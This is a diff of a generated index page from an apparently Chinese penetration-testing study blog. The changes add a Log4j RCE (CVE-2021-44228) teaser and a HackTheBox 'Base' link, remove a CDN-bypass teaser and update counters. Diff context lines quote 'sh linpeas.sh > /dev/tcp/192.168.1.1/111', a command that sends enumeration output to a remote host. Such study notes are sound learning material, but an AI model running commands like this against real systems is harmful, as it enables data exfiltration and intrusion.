@@ -4,7 +4,7 @@
   data-theme-mode="auto"
   >
   <head>
-	<meta name="generator" content="Hugo 0.159.1"><meta charset="utf-8" />
+	<meta name="generator" content="Hugo 0.159.2"><meta charset="utf-8" />
 <meta
   name="viewport"
   content="width=device-width, initial-scale=1, shrink-to-fit=no"
@@ -46,8 +46,8 @@
   />
   <meta property="og:image" content="https://test692618.github.io/images/banner.webp" />
   <meta property="article:author" content="L" />
-  <meta property="article:published_time" content="2026-04-01T00:00:00&#43;00:00" />
-  <meta property="article:modified_time" content="2026-04-01T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" /><link rel="alternate" type="application/rss+xml" href="https://test692618.github.io/index.xml" title="HELLO WORLD">
+  <meta property="article:published_time" content="2026-04-04T00:00:00&#43;00:00" />
+  <meta property="article:modified_time" content="2026-04-04T00:00:00&#43;00:00" /><meta name="twitter:card" content="summary" /><meta name="twitter:image" content="https://test692618.github.io/images/banner.webp" /><link rel="alternate" type="application/rss+xml" href="https://test692618.github.io/index.xml" title="HELLO WORLD">
 <link rel="shortcut icon" href="/favicon.ico"><link rel="stylesheet" href="/css/main.min.abc397b347f937380734b44bf4d20f195146ec63edf7d6b881124b192e152126.css" /><link
     rel="preload"
     as="style"
@@ -195,7 +195,7 @@
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">81</div>
+    <div>文章</div><div class="sidebar-state-number">82</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
@@ -518,6 +518,8 @@
       <h3 class="widget-title">最新文章</h3>
       <div class="widget">
         <ul><li>
+              <a href="/post/htb/htb%E6%89%93%E9%9D%B6-base/" title="htb-Base">htb-Base</a>
+            </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-markup/" title="htb-Markup">htb-Markup</a>
             </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-included/" title="htb-Included">htb-Included</a>
@@ -525,8 +527,6 @@
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-unified/" title="htb-Unified">htb-Unified</a>
             </li><li>
               <a href="/post/htb/htb%E6%89%93%E9%9D%B6-oopsie/" title="htb-Oopsie">htb-Oopsie</a>
-            </li><li>
-              <a href="/post/htb/htb%E6%89%93%E9%9D%B6-archetype/" title="htb-Archetype">htb-Archetype</a>
             </li></ul>
       </div>
     </div>
@@ -539,13 +539,54 @@
     data-aos="fade-up"
   ><a
         class="post-link"
+        href="/post/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/apache-log4j-2--rcecve-2021-44228/"
+        aria-label="Apache Log4j™ 2 -rce(CVE-2021-44228)"
+        title="Apache Log4j™ 2 -rce(CVE-2021-44228)"
+      >
+      </a><div
+      class="
+        post-cover left
+      "
+    ><img
+            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
+            data-sizes="auto"
+            alt="Apache Log4j™ 2 -rce(CVE-2021-44228)"
+            class="lazyload"
+          /></div>
+    <div class="post-info">
+      <div class="post-meta">
+        <span
+          ><span class="icon-calendar"></span
+          >2024-01-29</span
+        ><span
+          ><span class="icon-pencil"></span
+          >1010 字</span
+        >
+        <span
+          ><span class="icon-clock"></span
+          >3 分钟</span
+        >
+      </div>
+      <h2 class="post-title">Apache Log4j™ 2 -rce(CVE-2021-44228)</h2>
+      <article class="post-article"> 简介 apache log4j是一个基于java的日志记录工具，可对程序的输入输出行为进行日志记录。 漏洞出现版本：2.0—2.14.1 原因： log4j中的lookup功能中的jndi_lookup查询模块，它是其中一个用于查询日志的模块，允许用户通过相应的协议去远程请求主机资源，该模块未对输入数据进行判断。 JNDI支持ldap协议、dns协议、nis协议、rmi协议等。并且jndi支持以某种的方式去远程下载class文件，然后去执行，一旦下载了攻击者恶意构造的class文件，则会执行恶意代码。 通过Ldap协议和rmi协议可以远程下载class文件。 前置知识 JNDI（java命名 …</article>
+    </div>
+  </div>
+</div>
+<div class="post-wrapper">
+  <div
+    class="
+      post-wrap right
+    "
+    data-aos="fade-up"
+  ><a
+        class="post-link"
         href="/post/%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86/sql%E6%B3%A8%E5%85%A5/"
         aria-label="SQL注入"
         title="SQL注入"
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -576,7 +617,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -587,7 +628,7 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -619,7 +660,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -630,7 +671,7 @@
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -660,7 +701,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -671,7 +712,7 @@
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -704,7 +745,7 @@
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -715,7 +756,7 @@
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -750,7 +791,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -761,7 +802,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -794,7 +835,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -805,7 +846,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -835,7 +876,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap right
+      post-wrap left
     "
     data-aos="fade-up"
   ><a
@@ -846,7 +887,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover right
+        post-cover left
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -879,7 +920,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 <div class="post-wrapper">
   <div
     class="
-      post-wrap left
+      post-wrap right
     "
     data-aos="fade-up"
   ><a
@@ -890,7 +931,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       >
       </a><div
       class="
-        post-cover left
+        post-cover right
       "
     ><img
             data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
@@ -916,47 +957,6 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
       <article class="post-article"> 1.APP 公开数据网站查询 通过企业名称等方式查找
 企业查 小蓝本 点点数据 七麦数据 系统网站可能存在APP下载 ICP备案查询：只要是合规的APP都需要备案 多平台搜索，进行比对
 </article>
-    </div>
-  </div>
-</div>
-<div class="post-wrapper">
-  <div
-    class="
-      post-wrap right
-    "
-    data-aos="fade-up"
-  ><a
-        class="post-link"
-        href="/post/%E6%9D%82%E9%A1%B9/cdn%E7%BB%95%E8%BF%87/"
-        aria-label="CDN绕过"
-        title="CDN绕过"
-      >
-      </a><div
-      class="
-        post-cover right
-      "
-    ><img
-            data-src="https://d-sketon.top/img/_backwebp/bg1.webp"
-            data-sizes="auto"
-            alt="CDN绕过"
-            class="lazyload"
-          /></div>
-    <div class="post-info">
-      <div class="post-meta">
-        <span
-          ><span class="icon-calendar"></span
-          >2024-01-28</span
-        ><span
-          ><span class="icon-pencil"></span
-          >543 字</span
-        >
-        <span
-          ><span class="icon-clock"></span
-          >2 分钟</span
-        >
-      </div>
-      <h2 class="post-title">CDN绕过</h2>
-      <article class="post-article"> CDN 配置方式 1.针对单个域名进行CDN配置， 由于子域名可能会部署在一个服务器上，此时可通过子域名获取真实IP www.xx.com 配置了CDN加速 oa.xxx.com 未配置CDN加速 当然也有可能 *.xxx.com的方式 进行配置了CDN。 2.针对区域加速，仅对国内访问进行了CDN加速，此时可通过用国外IP访问的方式获取真实IP。 3.Z针对资源进行加速。 判定CDN 全球ping 获取真实IP方法 利用ssrf漏洞：若站点存在SSRF漏洞，可构造payload，访问自建的网站，通过自建网站的访问日志即可发现网站真实IP。 站点信息泄露：存在phpinfo等其他类似的内容。 …</article>
     </div>
   </div>
 </div>
@@ -986,10 +986,10 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
         >
       </div><div>
         <span class="icon-brush"
-          >&nbsp;79.5k</span
+          >&nbsp;81.0k</span
         >
         &nbsp;|&nbsp;
-        <span class="icon-coffee">&nbsp;03:22</span>
+        <span class="icon-coffee">&nbsp;03:25</span>
       </div><div>
         <span class="icon-eye"></span>
         <span id="busuanzi_container_site_pv"
@@ -1023,7 +1023,7 @@ sh linpeas.sh &gt; /dev/tcp/192.168.1.1/111 如果输出的a.txt文件有可能�
 </div>
 <div class="sidebar-state">
   <div class="sidebar-state-article">
-    <div>文章</div><div class="sidebar-state-number">81</div>
+    <div>文章</div><div class="sidebar-state-number">82</div>
   </div>
   <a class="sidebar-state-category" href="/categories/" aria-label="sidebar-state-category-link">
     <div>分类</div>
